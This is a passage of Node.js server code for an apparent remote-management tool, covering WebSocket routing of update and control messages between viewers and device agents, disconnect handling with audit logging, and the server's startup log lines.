      const target =
        product === "rest" ? termAgents.get(deviceId) : agents.get(deviceId);
      const label = product === "rest" ? "ReST" : "ReSA";
      if (!target) {
        send(ws, {
          type: "update_result",
          id: msg.id,
          product,
          ok: false,
          status: "failed",
          error: `${label} offline`,
        });
        return;
      }
      addAudit("update_request", { deviceId, product });
      send(target, { type: "update", id: msg.id, product });
      return;
    }

    if (
      (ws.role === "agent" || ws.role === "term") &&
      msg.type === "update_result"
    ) {
      const set = viewers.get(deviceId);
      if (!set) return;
      for (const viewer of set) send(viewer, msg);
      return;
    }

    if (ws.role === "viewer" && msg.type === "control") {
      const agent = agents.get(deviceId);
      if (agent) send(agent, msg);
    }
  });

  ws.on("close", () => {
    if (ws.role === "agent" && agents.get(deviceId) === ws) {
      agents.delete(deviceId);
      const meta = agentMeta.get(deviceId);
      if (meta) meta.lastSeen = new Date().toISOString();

      const set = viewers.get(deviceId);
      if (set) {
        for (const viewer of set) {
          send(viewer, { type: "agent_offline", deviceId });
        }
      }
      addAudit("agent_offline", { deviceId, ip: clientIp });
      broadcastDashboard("devices_changed", { devices: listDevices() });
      console.log(`[agent] offline: ${deviceId}`);
    }

    if (ws.role === "term" && termAgents.get(deviceId) === ws) {
      termAgents.delete(deviceId);
      const meta = agentMeta.get(deviceId);
      if (meta) meta.lastSeen = new Date().toISOString();
      const set = viewers.get(deviceId);
      if (set) {
        for (const viewer of set) {
          send(viewer, { type: "term_offline", deviceId });
        }
      }
      addAudit("term_offline", { deviceId, ip: clientIp });
      broadcastDashboard("devices_changed", { devices: listDevices() });
      console.log(`[term] offline: ${deviceId}`);
    }

    if (ws.role === "viewer") {
      const set = viewers.get(deviceId);
      if (set) {
        set.delete(ws);
        if (set.size === 0) viewers.delete(deviceId);
      }
      notifyAgentViewerCount(deviceId);
      addAudit("viewer_disconnect", { deviceId, ip: clientIp });
      broadcastDashboard("devices_changed", { devices: listDevices() });
      console.log(`[viewer] disconnected <- ${deviceId}`);
    }
  });
});

server.listen(PORT, () => {
  console.log(`Server: http://localhost:${PORT}`);
  console.log(`Viewer: http://localhost:${PORT}/?device=PC-001`);
  console.log(`WebSocket: ws://localhost:${PORT}/ws`);
  console.log(`Access token: ${ACCESS_TOKEN}`);
  console.log(`Set ACCESS_TOKEN env var before production.`);
});
